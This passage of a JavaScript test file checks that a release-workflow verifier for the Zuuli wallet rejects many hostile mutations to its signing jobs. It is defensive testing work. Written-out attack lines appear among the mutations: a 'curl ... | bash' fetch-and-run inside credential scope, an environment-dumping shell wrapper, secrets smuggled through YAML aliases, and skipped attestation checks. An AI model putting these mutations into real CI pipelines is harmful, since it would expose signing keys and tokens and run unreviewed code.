  assert.doesNotMatch(result.stdout, /REACHED/);
});

const androidProtectedMutations = [
  [
    "stale source reset after Android identity verification",
    (source) => source.replace(
      "      - name: Build source-bound unsigned universal AAB\n",
      "      - name: Substitute stale Android source after identity verification\n        run: cd ../.. && git reset --hard HEAD~1\n      - name: Build source-bound unsigned universal AAB\n",
    ),
  ],
  [
    "stale source reset hidden in the Android build step",
    (source) => source.replace(
      "          set -euo pipefail\n          scripts/assert-no-android-credentials.sh\n",
      "          set -euo pipefail\n          cd ../.. && git reset --hard HEAD~1 && cd wallet/zuuli\n          scripts/assert-no-android-credentials.sh\n",
    ),
  ],
  [
    "unpinned protected signing JVM",
    (source) => source.replace(
      "    steps:\n      - uses: actions/setup-java@b6effb05e454b25005698d916606bdc6ffcbf961 # v5\n",
      "    steps:\n      - uses: actions/setup-java@main\n",
    ),
  ],
  [
    "deleted protected signing JVM proof",
    (source) => source.replace(
      "      - name: Verify pinned Android signing JVM\n        run: java -version 2>&1 | grep -F '21.0.12'\n",
      "",
    ),
  ],
  [
    "checkout",
    (source) => source.replace(
      "      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
      "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
    ),
  ],
  [
    "cache restore",
    (source) => source.replace(
      "      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
      "      - uses: actions/cache@v4\n        with: { path: target, key: hostile }\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
    ),
  ],
  [
    "dependency setup",
    (source) => source.replace(
      "      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
      "      - uses: actions/setup-node@v4\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7\n",
    ),
  ],
  [
    "second artifact download",
    (source) => source.replace(
      "          path: unsigned-android\n",
      "          path: unsigned-android\n      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131\n        with: { pattern: '*', path: extra }\n",
    ),
  ],
  [
    "skipped source verification",
    (source) => source.replace(
      "      - name: Verify source-bound artifact checksum and attestation\n",
      "      - name: Verify source-bound artifact checksum and attestation\n        if: false\n",
    ),
  ],
  [
    "soft-failed source verification",
    (source) => source.replace(
      "      - name: Verify source-bound artifact checksum and attestation\n",
      "      - name: Verify source-bound artifact checksum and attestation\n        continue-on-error: true\n",
    ),
  ],
  [
    "skipped artifact inspection",
    (source) => source.replace(
      "      - name: Inspect attested Android artifact without credentials\n",
      "      - name: Inspect attested Android artifact without credentials\n        if: false\n",
    ),
  ],
  [
    "soft-failed artifact inspection",
    (source) => source.replace(
      "      - name: Inspect attested Android artifact without credentials\n",
      "      - name: Inspect attested Android artifact without credentials\n        continue-on-error: true\n",
    ),
  ],
  [
    "credential exposed before verification",
    (source) => source.replace(
      "          GH_TOKEN: ${{ github.token }}\n",
      "          GH_TOKEN: ${{ github.token }}\n          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
    ),
  ],
  [
    "GitHub token exposed to artifact parser",
    (source) => source.replace(
      "      - name: Inspect attested Android artifact without credentials\n        env:\n          EXPECTED_IDENTITY: ${{ needs.prepare.outputs.identity }}\n",
      "      - name: Inspect attested Android artifact without credentials\n        env:\n          EXPECTED_IDENTITY: ${{ needs.prepare.outputs.identity }}\n          GH_TOKEN: ${{ github.token }}\n",
    ),
  ],
  [
    "deleted provenance verification",
    (source) => source.replace(
      "          gh attestation verify unsigned-android/CHECKSUMS.sha256 \\\n",
      "          true \\\n",
    ),
  ],
  [
    "dependency fetch before secret scope",
    (source) => source.replace(
      "      - name: Inspect attested Android artifact without credentials\n",
      "      - name: Fetch an unreviewed verifier dependency\n        run: curl https://example.invalid/verifier.jar -o verifier.jar\n      - name: Inspect attested Android artifact without credentials\n",
    ),
  ],
  [
    "stale source accepted",
    (source) => source.replace(
      "and .source.sha == $source and .artifact.sha256 == $sha",
      "and .artifact.sha256 == $sha",
    ),
  ],
  [
    "verifier tooling retained into secret scope",
    (source) => source.replace('          rm -f -- "$bundletool" "$RUNNER_TEMP/current-aab-members.txt"\n', "          true\n"),
  ],
  [
    "build command in credential scope",
    (source) => source.replace(
      "          umask 077\n",
      "          umask 077\n          cargo build --release\n",
    ),
  ],
  [
    "dependency fetch in credential scope",
    (source) => source.replace(
      "          umask 077\n",
      "          umask 077\n          curl https://example.invalid/dependency.sh | bash\n",
    ),
  ],
  [
    "retry expanded to token minting",
    (source) => source.replace(
      "            token=$(curl --fail --silent --show-error \\\n",
      "            token=$(curl --fail --silent --show-error --retry 3 --retry-all-errors \\\n",
    ),
  ],
  [
    "skipped credential cleanup",
    (source) => source.replace(
      "      - name: Destroy ephemeral Android credentials\n        if: always()\n",
      "      - name: Destroy ephemeral Android credentials\n        if: false\n",
    ),
  ],
  [
    "soft-failed credential cleanup",
    (source) => source.replace(
      "      - name: Destroy ephemeral Android credentials\n        if: always()\n",
      "      - name: Destroy ephemeral Android credentials\n        if: always()\n        continue-on-error: true\n",
    ),
  ],
  [
    "skipped signed-output cleanup",
    (source) => source.replace(
      "      - name: Destroy signed Android output\n        if: always()\n",
      "      - name: Destroy signed Android output\n        if: false\n",
    ),
  ],
  [
    "release index accepts a skipped protected signer for an Android target",
    (source) => source.replace(
      "      needs.android-sign-upload.result == 'success' &&\n",
      "      needs.android-sign-upload.result == 'skipped' &&\n",
    ),
  ],
  [
    "skipped signed-artifact finalizer verification",
    (source) => source.replace(
      "      - name: Verify signed AAB and prepare shipped artifact\n",
      "      - name: Verify signed AAB and prepare shipped artifact\n        if: false\n",
    ),
  ],
  [
    "soft-failed signed-artifact finalizer verification",
    (source) => source.replace(
      "      - name: Verify signed AAB and prepare shipped artifact\n",
      "      - name: Verify signed AAB and prepare shipped artifact\n        continue-on-error: true\n",
    ),
  ],
  [
    "decorative no-op signed-artifact verification",
    (source) => source
      .replace(
        "          (cd signed-android && sha256sum -c CHECKSUMS.sha256)\n",
        "          : <<'DECORATIVE_VERIFICATION'\n          (cd signed-android && sha256sum -c CHECKSUMS.sha256)\n",
      )
      .replace(
        "          mkdir release-artifacts\n          cp \"signed-android/ZUULI-${EXPECTED_IDENTITY}-android.aab\" release-artifacts/\n",
        "          DECORATIVE_VERIFICATION\n          mkdir release-artifacts\n          cp \"signed-android/ZUULI-${EXPECTED_IDENTITY}-android.aab\" release-artifacts/\n",
      ),
  ],
  [
    "finalizer accepts a stale signed source record",
    (source) => source.replace(
      ".identity == $identity and .sourceSha == $source and .signedSha256 == $sha",
      ".identity == $identity and .signedSha256 == $sha",
    ),
  ],
  [
    "finalizer omits the expected signed AAB digest check",
    (source) => source.replace(
      "          test \"$(sha256sum \"signed-android/ZUULI-${EXPECTED_IDENTITY}-android.aab\" | awk '{print $1}')\" = \"$EXPECTED_SIGNED_SHA256\"\n",
      "          true # signed AAB digest check removed\n",
    ),
  ],
];

test("current Android protected program rejects boundary mutations", async () => {
  const workflow = await readFile(protectedReleaseWorkflow, "utf8");
  assert.deepEqual(verifyAppleCredentialBoundary(workflow), []);
  for (const [label, mutate] of androidProtectedMutations) {
    const mutated = mutate(workflow);
    assert.notEqual(mutated, workflow, `${label} mutation did not apply`);
    const failures = verifyAppleCredentialBoundary(mutated);
    assert.ok(failures.length > 0, `${label} mutation escaped the protected-job policy`);
  }
});

const protectedReleaseWorkflow = new URL(
  "../../../.github/workflows/zuuli-release.yml",
  import.meta.url,
);
const developerIdProfileFixture = new URL(
  "./fixtures/developer-id-profile.plist",
  import.meta.url,
);

function replaceFixture(source, needle, replacement) {
  assert.ok(source.includes(needle), `profile fixture is missing ${needle}`);
  return source.replace(needle, replacement);
}

function extractProfileVerifier(workflow, job) {
  const document = parseDocument(workflow);
  assert.deepEqual(document.errors, []);
  const run = document.toJS().jobs[job].steps.find(
    (step) => typeof step.run === "string" && step.run.includes("verify_developer_id_profile()"),
  )?.run;
  assert.equal(typeof run, "string", `${job} has no executable profile verifier`);
  const start = run.indexOf("verify_developer_id_profile() {");
  const end = run.indexOf("\n}\n", start);
  assert.notEqual(start, -1, `${job} verifier function is missing`);
  assert.notEqual(end, -1, `${job} verifier function is unterminated`);
  return run.slice(start, end + 2);
}

function runProfileVerifier(verifier, profile, now) {
  return spawnSync(
    "/bin/bash",
    ["-c", `set -euo pipefail\n${verifier}\nverify_developer_id_profile "$PROFILE_PATH" "$PROFILE_NOW"`],
    {
      encoding: "utf8",
      env: { ...process.env, PROFILE_PATH: profile, PROFILE_NOW: String(now) },
    },
  );
}

test(
  "both workflow trust boundaries execute typed Developer ID profile verification",
  { skip: process.platform !== "darwin" },
  async (context) => {
    const workflow = await readFile(protectedReleaseWorkflow, "utf8");
    const fixture = await readFile(developerIdProfileFixture, "utf8");
    const jsonConversion = spawnSync(
      "plutil",
      ["-convert", "json", "-o", "-", fileURLToPath(developerIdProfileFixture)],
      { encoding: "utf8" },
    );
    assert.notEqual(
      jsonConversion.status,
      0,
      "the real <date> fixture must retain the regression that JSON conversion cannot handle",
    );

    const temporary = await mkdtemp(join(tmpdir(), "zuuli-developer-id-profile-test."));
    context.after(() => rm(temporary, { recursive: true, force: true }));
    const now = Math.floor(Date.parse("2030-06-01T00:00:00Z") / 1000);
    const mutations = [
      [
        "missing CreationDate",
        replaceFixture(
          fixture,
          "\t<key>CreationDate</key>\n\t<date>2020-01-02T03:04:05Z</date>\n",
          "",
        ),
      ],
      [
        "string-typed CreationDate",
        replaceFixture(
          fixture,
          "<date>2020-01-02T03:04:05Z</date>",
          "<string>2020-01-02T03:04:05Z</string>",
        ),
      ],
      [
        "missing ExpirationDate",
        replaceFixture(
          fixture,
          "\t<key>ExpirationDate</key>\n\t<date>2099-12-30T23:59:58Z</date>\n",
          "",
        ),
      ],
      ["future CreationDate", replaceFixture(fixture, "2020-01-02T03:04:05Z", "2040-01-02T03:04:05Z")],
      ["expired ExpirationDate", replaceFixture(fixture, "2099-12-30T23:59:58Z", "2025-12-30T23:59:58Z")],
      ["altered team identifier", replaceFixture(fixture, "F9AV5HKF6N</string>", "ATTACKTEAM</string>")],
      [
        "non-array team identifier",
        replaceFixture(
          fixture,
          "\t<array>\n\t\t<string>F9AV5HKF6N</string>\n\t</array>\n\t<key>ProvisionsAllDevices</key>",
          "\t<string>F9AV5HKF6N</string>\n\t<key>ProvisionsAllDevices</key>",
        ),
      ],
      ["disabled all-device distribution", replaceFixture(fixture, "\t<true/>\n", "\t<false/>\n")],
      [
        "altered application identifier",
        replaceFixture(
          fixture,
          "F9AV5HKF6N.cash.free2z.zuuli</string>",
          "F9AV5HKF6N.cash.attacker.app</string>",
        ),
      ],
      [
        "unauthorized keychain access group",
        replaceFixture(
          fixture,
          "\t\t\t<string>F9AV5HKF6N.*</string>",
          "\t\t\t<string>ATTACKTEAM.shared-secrets</string>",
        ),
      ],
      [
        "same-team unrelated keychain access group only",
        replaceFixture(
          fixture,
          "\t\t<array>\n\t\t\t<string>F9AV5HKF6N.cash.free2z.zuuli</string>\n\t\t\t<string>F9AV5HKF6N.*</string>\n\t\t</array>",
          "\t\t<array>\n\t\t\t<string>F9AV5HKF6N.cash.unrelated</string>\n\t\t</array>",
        ),
      ],
      [
        "non-array keychain access groups",
        replaceFixture(
          fixture,
          "\t\t<array>\n\t\t\t<string>F9AV5HKF6N.cash.free2z.zuuli</string>\n\t\t\t<string>F9AV5HKF6N.*</string>\n\t\t</array>",
          "\t\t<string>F9AV5HKF6N.cash.free2z.zuuli</string>",
        ),
      ],
    ];

    for (const job of ["macos-sign", "macos-finalize"]) {
      const verifier = extractProfileVerifier(workflow, job);
      const validProfile = join(temporary, `${job}-valid.plist`);
      await writeFile(validProfile, fixture);
      const valid = runProfileVerifier(verifier, validProfile, now);
      assert.equal(valid.status, 0, `${job} rejected a valid typed profile: ${valid.stderr}`);
      for (const [label, mutation] of mutations) {
        const profile = join(temporary, `${job}-${label.replaceAll(" ", "-")}.plist`);
        await writeFile(profile, mutation);
        const result = runProfileVerifier(verifier, profile, now);
        assert.notEqual(result.status, 0, `${job} accepted ${label}`);
      }
    }
  },
);

test("rejects the actionlint-valid two-file reusable-workflow escape", () => {
  const caller = validWorkflow.replace(
    "  release-index:\n",
    "  credential-escape:\n    uses: ./.github/workflows/credential-escape.yml\n    secrets: inherit\n  release-index:\n",
  );
  assert.equal(parseDocument(caller).errors.length, 0);
  assert.equal(parseDocument(credentialEscapeWorkflow).errors.length, 0);
  assert.match(credentialEscapeWorkflow, /environment: zuuli-app-stores/);
  assert.match(credentialEscapeWorkflow, /wallet\/zuuli\/scripts\/project-hook\.sh/);
  const failures = verifyFixture(caller);
  assert.ok(failures.some((failure) => failure.includes("workflow jobs must be exactly")), failures.join("\n"));
  assert.ok(
    failures.some((failure) => failure.includes("credential-escape contains forbidden reusable-workflow uses")),
    failures.join("\n"),
  );
  assert.ok(
    failures.some((failure) => failure.includes("credential-escape contains forbidden job-level secrets forwarding")),
    failures.join("\n"),
  );
});

for (const [name, mutate, expected] of [
  [
    "rejects a protected build environment",
    (source) => source.replace("  ios-build:\n", "  ios-build:\n    environment: zuuli-app-stores\n"),
    "ios-build contains forbidden protected environment",
  ],
  [
    "rejects a secret in dependency-controlled build",
    (source) => source.replace(
      "  ios-build:\n",
      "  ios-build:\n    env:\n      LEAK: ${{ secrets.ASC_KEY_BASE64 }}\n",
    ),
    "ios-build contains unauthorized secrets-context expression",
  ],
  [
    "rejects a build without a pre-install credential canary",
    (source) => source.replace(
      "      - run: scripts/assert-no-apple-credentials.sh\n      - run: npm ci",
      "      - run: npm ci",
    ),
    "ios-build must run the credential canary before dependency install",
  ],
  [
    "rejects a build without a post-build credential canary",
    (source) => source.replace(
      "          shasum -a 256 ZUULI.xcarchive.zip ExportOptions.plist source-record.json > CHECKSUMS.sha256\n      - run: scripts/assert-no-apple-credentials.sh",
      "          shasum -a 256 ZUULI.xcarchive.zip ExportOptions.plist source-record.json > CHECKSUMS.sha256",
    ),
    "ios-build must run the credential canary after the unsigned build",
  ],
  [
    "rejects source checkout in a signer",
    (source) => source.replace(
      "      - uses: actions/download-artifact@sha\n",
      "      - uses: actions/checkout@sha\n      - uses: actions/download-artifact@sha\n",
    ),
    "android-sign-upload contains forbidden \"actions/checkout@\"",
  ],
  [
    "rejects a Tauri rebuild in a signer",
    (source) => source.replace("run: xcodebuild -exportArchive", "run: tauri ios build && xcodebuild -exportArchive"),
    "ios-sign contains forbidden \"tauri \"",
  ],
  [
    "rejects secrets before artifact verification",
    (source) => source.replace("      - uses: actions/download-artifact@sha\n", ""),
    "must verify its downloaded artifact before any secrets-context expression",
  ],
  [
    "rejects finalization before cleanup",
    (source) => source.replace(
      "      - name: Destroy ephemeral credential\n",
      "      - name: Leave ephemeral credential in place\n",
    ),
    "must destroy every credential class before artifact upload",
  ],
  [
    "rejects a later credential class after the last cleanup",
    (source) => source.replace(
      "\n  ios-verify:",
      "\n      - env:\n          LATE_SECRET: ${{ secrets.LATE_SECRET }}\n        run: echo late\n\n  ios-verify:",
    ),
    "must destroy every credential class before artifact upload",
  ],
  [
    "rejects a secret in credential-free signed-artifact verification",
    (source) => source.replace(
      "  ios-verify:\n",
      "  ios-verify:\n    env:\n      LEAK: ${{ secrets.ASC_KEY_BASE64 }}\n",
    ),
    "ios-verify contains unauthorized secrets-context expression",
  ],
  [
    "rejects an uploader that does not provenance-verify its reconciliation helper",
    (source) => source.replace(
      "          gh attestation verify verified-ios/asc-testflight.mjs --repo repo\n",
      "",
    ),
    "iOS uploader is missing \"gh attestation verify verified-ios/asc-testflight.mjs\"",
  ],
  [
    "rejects an iOS signer without keychain restoration evidence",
    (source) => source.replace("          echo original-keychains.txt cleanup-failed\n", ""),
    "iOS signer is missing \"original-keychains.txt\"",
  ],
  [
    "rejects a macOS signer without keychain restoration evidence",
    (source) => source.replaceAll("          echo original-keychains.txt cleanup-failed\n", ""),
    "macOS signer is missing \"original-keychains.txt\"",
  ],
  [
    "rejects a workflow-global secret context",
    (source) => source.replace("  CI: true\n", "  CI: true\n  LEAK: ${{ secrets.GLOBAL }}\n"),
    "workflow root env authority changed",
  ],
  [
    "rejects bracket secret syntax in an unsigned build",
    (source) => source.replace(
      "  ios-build:\n",
      "  ios-build:\n    env:\n      LEAK: ${{ secrets['APPLE_SECRET'] }}\n",
    ),
    "ios-build contains unauthorized secrets-context expression",
  ],
  [
    "rejects function-wrapped secret context in finalization",
    (source) => source.replace(
      "  ios-finalize:\n",
      "  ios-finalize:\n    env:\n      LEAK: ${{ toJSON(secrets) }}\n",
    ),
    "ios-finalize contains unauthorized secrets-context expression",
  ],
  [
    "rejects YAML aliases that can obscure credential inheritance",
    (source) => source.replace("jobs:\n", "x-secret: &apple_secret ${{ secrets.VALUE }}\njobs:\n"),
    "contains forbidden YAML anchor",
  ],
  [
    "rejects an Apple secret smuggled into the Android credential job",
    (source) => source.replace(
      "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
      "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n          APPLE_LEAK: ${{ secrets.ASC_KEY_BASE64 }}\n",
    ),
    "android-sign-upload contains unauthorized secrets-context expression \"${{ secrets.ASC_KEY_BASE64 }}\"",
  ],
  [
    "rejects a flow anchor in Android aliased into the unsigned iOS build",
    (source) => source
      .replace(
        "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
        "          KEYSTORE_BASE64: &apple ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
      )
      .replace("  ios-build:\n", "  ios-build:\n    env: { APPLE_LEAK: *apple }\n"),
    "contains forbidden YAML alias",
  ],
  ...[
    ["numeric", "1"],
    ["dotted", "apple.key"],
    ["leading-hyphen", "-apple"],
  ].map(([label, anchor]) => [
    `rejects an actionlint-valid ${label} anchor and alias`,
    (source) => source
      .replace(
        "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
        `          KEYSTORE_BASE64: &${anchor} \${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n`,
      )
      .replace("  ios-build:\n", `  ios-build:\n    env: { APPLE_LEAK: *${anchor} }\n`),
    "contains forbidden YAML",
  ]),
  [
    "rejects an explicit protected-environment mapping key",
    (source) => source.replace(
      "  ios-build:\n",
      "  ios-build:\n    ? environment\n    : zuuli-app-stores\n",
    ),
    "contains forbidden explicit YAML mapping key",
  ],
  [
    "rejects a tagged protected-environment mapping key",
    (source) => source.replace(
      "  ios-build:\n",
      "  ios-build:\n    !!str environment: zuuli-app-stores\n",
    ),
    "environment contains forbidden tagged YAML mapping key",
  ],
  [
    "rejects duplicate YAML mapping keys",
    (source) => source.replace(
      "  ios-build:\n",
      "  ios-build:\n    environment: first\n    environment: second\n",
    ),
    "workflow YAML is invalid: Map keys must be unique",
  ],
  [
    "does not mistake quoted hash and pipe text for a block scalar",
    (source) => source
      .replace(
        "          KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
        "          KEYSTORE_BASE64: &apple ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\n",
      )
      .replace(
        "      - run: npm ci\n",
        "      - name: \"install: | # not a block\"\n        env: { APPLE_LEAK: *apple }\n        run: npm ci\n",
      ),
    "contains forbidden YAML",
  ],
  [
    "rejects job-level reusable workflow execution and secret forwarding",
    (source) => source.replace(
      "  linux:\n    container:\n      credentials:\n        password: ${{ secrets.GITHUB_TOKEN }}\n",
      "  linux:\n    uses: ./.github/workflows/credential-escape.yml\n    secrets: inherit\n",
    ),
    "linux contains forbidden reusable-workflow uses",
  ],
  [
    "rejects the Linux pull token in an npm step",
    (source) => source.replace(
      "        password: ${{ secrets.GITHUB_TOKEN }}\n",
      "        password: ${{ secrets.GITHUB_TOKEN }}\n    steps:\n      - run: npm ci\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
    ),
    "linux contains unauthorized secrets-context expression",
  ],
  [
    "rejects moving the Linux pull token out of container credentials",
    (source) => source.replace(
      "    container:\n      credentials:\n        password: ${{ secrets.GITHUB_TOKEN }}\n",
      "    steps:\n      - run: npm ci\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n",
    ),
    "linux container pull password must be exactly secrets.GITHUB_TOKEN",
  ],
  [
    "rejects a top-level shell wrapper inherited by credential steps",
    (source) => source.replace(
      "permissions:\n",
      "defaults:\n  run:\n    shell: bash -c 'env > /tmp/apple-step-environment; exec bash \"$1\"' -- {0}\npermissions:\n",
    ),
    "workflow root keys must be exactly",
  ],
  [
    "rejects inherited top-level environment drift",
    (source) => source.replace("  CI: true\n", "  CI: true\n  BASH_ENV: /tmp/project-hook\n"),
    "workflow root env authority changed",
  ],
  [
    "rejects release trigger drift",
    (source) => source.replace("    branches: [main]\n", "    branches: [main, attacker]\n"),
    "workflow root on authority changed",
  ],
  [
    "rejects global permission drift",
    (source) => source.replace("  contents: read\n", "  contents: write\n"),
    "workflow root permissions authority changed",
  ],
  [
    "rejects release concurrency drift",
    (source) => source.replace("  cancel-in-progress: false\n", "  cancel-in-progress: true\n"),
    "workflow root concurrency authority changed",
  ],
  [
    "rejects a single-quoted protected environment key on an unsigned build",
    (source) => source.replace("  ios-build:\n", "  ios-build:\n    'environment': zuuli-app-stores\n"),
    "ios-build contains forbidden protected environment",
  ],
  [
    "rejects a double-quoted protected environment key on an unsigned build",
    (source) => source.replace(
      "  ios-build:\n",
      "  ios-build:\n    \"environment\": zuuli-app-stores\n",
    ),
    "ios-build contains forbidden protected environment",
  ],
  [
    "rejects a mapping protected environment on finalization",
    (source) => source.replace(
      "  macos-finalize:\n",
      "  macos-finalize:\n    environment:\n      name: zuuli-app-stores\n",
    ),
    "macos-finalize contains forbidden protected environment",
  ],
  [
    "rejects an unsigned iOS manifest that omits ExportOptions",
    (source) => source.replace("ZUULI.xcarchive.zip ExportOptions.plist source-record.json", "ZUULI.xcarchive.zip source-record.json"),
    "iOS unsigned builder is missing \"ZUULI.xcarchive.zip ExportOptions.plist source-record.json > CHECKSUMS.sha256\"",
  ],
  [
    "rejects an unsigned macOS manifest that omits the shipping layout",
    (source) => source.replace("Entitlements.plist Info.macos.plist ZUULI.app.zip ZUULI-layout.dmg source-record.json", "Entitlements.plist Info.macos.plist ZUULI.app.zip source-record.json"),
    "macOS unsigned builder is missing \"Entitlements.plist Info.macos.plist ZUULI.app.zip ZUULI-layout.dmg source-record.json > CHECKSUMS.sha256\"",
  ],
  [
    "rejects a macOS build that skips the entitlement policy",
    (source) => source.replace("      - run: node scripts/macos-keychain-entitlements.mjs\n", ""),
    "macOS unsigned builder is missing \"node scripts/macos-keychain-entitlements.mjs\"",
  ],
  [
    "rejects a macOS signer that omits reviewed entitlements",
    (source) => source.replace("--entitlements unsigned-macos/Entitlements.plist ", ""),
    "macOS signer is missing \"--entitlements unsigned-macos/Entitlements.plist\"",
  ],
  [
    "rejects a macOS signer that omits its authorizing profile",
    (source) => source.replace("embedded.provisionprofile ", ""),
    "macOS signer is missing \"embedded.provisionprofile\"",
  ],
  [
    "rejects a macOS signer without typed profile CreationDate extraction",
    (source) => source.replace("plutil -extract CreationDate raw -expect date", "plutil -extract CreationDate raw"),
    'macOS signer is missing "plutil -extract CreationDate raw -expect date"',
  ],
  [
    "rejects a macOS signer without typed profile ExpirationDate extraction",
    (source) => source.replace("plutil -extract ExpirationDate raw -expect date", "plutil -extract ExpirationDate raw"),
    'macOS signer is missing "plutil -extract ExpirationDate raw -expect date"',
  ],
  [
    "rejects a macOS signer that permits future-created profiles",
    (source) => source.replace(
      "created_epoch <= profile_now && profile_now < expiration_epoch",
      "profile_now < expiration_epoch",
    ),
    'macOS signer is missing "created_epoch <= profile_now && profile_now < expiration_epoch"',
  ],
  [
    "rejects a macOS signer without literal keychain-group authorization",
    (source) => source.replace(
      '[[ "$group" == F9AV5HKF6N.cash.free2z.zuuli || "$group" == \'F9AV5HKF6N.*\' ]]',
      'case "$group" in F9AV5HKF6N.*) true;; esac',
    ),
    'macOS signer is missing "[[ \\"$group\\" == F9AV5HKF6N.cash.free2z.zuuli || \\"$group\\" == \'F9AV5HKF6N.*\' ]]"',
  ],
  [
    "rejects a macOS finalizer without typed team-array extraction",
    (source) => removeLast(source, "plutil -extract TeamIdentifier raw -expect array"),
    'macOS finalizer is missing "plutil -extract TeamIdentifier raw -expect array"',
  ],
  [
    "rejects a macOS finalizer without typed keychain-group extraction",
    (source) => removeLast(source, "plutil -extract Entitlements.keychain-access-groups raw -expect array"),
    'macOS finalizer is missing "plutil -extract Entitlements.keychain-access-groups raw -expect array"',
  ],
  [
    "rejects a macOS finalizer that permits expired profiles",
    (source) => removeLast(source, "created_epoch <= profile_now && profile_now < expiration_epoch"),
    'macOS finalizer is missing "created_epoch <= profile_now && profile_now < expiration_epoch"',
  ],
  [
    "rejects a macOS finalizer without literal keychain-group authorization",
    (source) => removeLast(
      source,
      '[[ "$group" == F9AV5HKF6N.cash.free2z.zuuli || "$group" == \'F9AV5HKF6N.*\' ]]',
    ),
    'macOS finalizer is missing "[[ \\"$group\\" == F9AV5HKF6N.cash.free2z.zuuli || \\"$group\\" == \'F9AV5HKF6N.*\' ]]"',
  ],
  [
    "rejects an iOS signer that does not bind the attested checksum manifest",
    (source) => source.replace(
      "          test \"$(shasum -a 256 unsigned-ios/CHECKSUMS.sha256 | awk '{print $1}')\" = \"$EXPECTED_PAYLOAD_SHA256\"\n",
      "",
    ),
    "iOS signer is missing \"test \\\"$(shasum -a 256 unsigned-ios/CHECKSUMS.sha256\"",
  ],
  [
    "rejects a macOS signer that does not attest the checksum manifest",
    (source) => source.replace("          gh attestation verify unsigned-macos/CHECKSUMS.sha256 --repo repo\n", ""),
    "macOS signer is missing \"gh attestation verify unsigned-macos/CHECKSUMS.sha256\"",
  ],
  [
    "rejects an iOS signer without provisioning-profile absence readback",
    (source) => source.replace(
      "          if [[ -e \"$HOME/Library/MobileDevice/Provisioning Profiles/e5ead62c-83ec-4e54-abb6-4770833b5e0d.mobileprovision\" ]]; then echo survived; fi\n",
      "",
    ),
    "iOS signer is missing \"if [[ -e \\\"$HOME/Library/MobileDevice/Provisioning Profiles/e5ead62c-83ec-4e54-abb6-4770833b5e0d.mobileprovision\\\" ]]\"",
  ],
  [
    "rejects a macOS signer without mounted-image readback",
    (source) => source.replace("          if hdiutil info | grep -Fq 'zuuli-macos-dmg-sign.'; then echo mounted; fi\n", ""),
    "macOS signer is missing \"if hdiutil info | grep -Fq 'zuuli-macos-dmg-sign.'\"",
  ],
  [
    "rejects an iOS signer that ignores provisioning-profile removal failure",
    (source) => source.replace(
      "          if [[ -n \"$profile_path\" ]] && ! rm -f -- \"$profile_path\"; then echo cleanup; fi\n",
      "",
    ),
    "iOS signer is missing \"if [[ -n \\\"$profile_path\\\" ]] && ! rm -f -- \\\"$profile_path\\\"\"",
  ],
  [
    "rejects a macOS signer that ignores forced-detach failure",
    (source) => source.replace(
      "          if [[ \"$mounted\" == true ]] && ! hdiutil detach \"$mountpoint\" -force; then echo cleanup; fi\n",
      "",
    ),
    "macOS signer is missing \"if [[ \\\"$mounted\\\" == true ]] && ! hdiutil detach \\\"$mountpoint\\\" -force\"",
  ],
  ...["bash", "sh", "python3", "ruby", "node"].map((interpreter) => [
    `rejects ${interpreter} execution added to the iOS credential job`,
    (source) => source.replace(
      "run: xcodebuild -exportArchive",
      `run: xcodebuild -exportArchive && ${interpreter} unsigned-ios/post-sign.sh`,
    ),
    "ios-sign credential execution program changed",
  ]),
  [
    "rejects an extra builder file followed by credential-job execution",
    (source) => source
      .replace(
        "          shasum -a 256 ZUULI.xcarchive.zip ExportOptions.plist source-record.json > CHECKSUMS.sha256",
        "          touch post-sign.sh\n          shasum -a 256 ZUULI.xcarchive.zip ExportOptions.plist source-record.json > CHECKSUMS.sha256",
      )
      .replace(
        "run: xcodebuild -exportArchive",
        "run: xcodebuild -exportArchive && bash unsigned-ios/post-sign.sh",
      ),
    "ios-sign credential execution program changed",
  ],
  [
    "rejects a credential-job shell override",
    (source) => source.replace(
      "      - name: Operate\n        run: xcodebuild -exportArchive",
      "      - name: Operate\n        shell: python\n        run: xcodebuild -exportArchive",
    ),
    "ios-sign credential execution program changed",
  ],
  [
    "rejects credential-job action input drift",
    (source) => source.replace(
      "      - uses: actions/download-artifact@sha\n",
      "      - uses: actions/download-artifact@sha\n        with: { path: attacker-controlled }\n",
    ),
    "android-sign-upload credential execution program changed",
  ],
  [
    "rejects credential-job defaults that replace the reviewed shell",
    (source) => source.replace(
      "  ios-sign:\n",
      "  ios-sign:\n    defaults: { run: { shell: python } }\n",
    ),
    "ios-sign credential execution program changed",
  ],
]) {
  test(name, () => {
    const failures = verifyFixture(mutate(validWorkflow));
    assert.ok(failures.some((failure) => failure.includes(expected)), failures.join("\n"));
  });
}

function shasum(directory, args) {
  return spawnSync("shasum", ["-a", "256", ...args], {
    cwd: directory,
    encoding: "utf8",
  });
}

function verifyCanonicalPayload(directory, expectedManifestDigest) {
  const manifest = shasum(directory, ["CHECKSUMS.sha256"]);
  if (manifest.status !== 0) return false;
  if (manifest.stdout.trim().split(/\s+/)[0] !== expectedManifestDigest) return false;
  return shasum(directory, ["-c", "CHECKSUMS.sha256"]).status === 0;
}

async function hasExactMembers(directory, expected) {
  const entries = await readdir(directory, { recursive: true });
  if (JSON.stringify(entries.sort()) !== JSON.stringify([...expected].sort())) return false;
  const stats = await Promise.all(entries.map((entry) => lstat(join(directory, entry))));
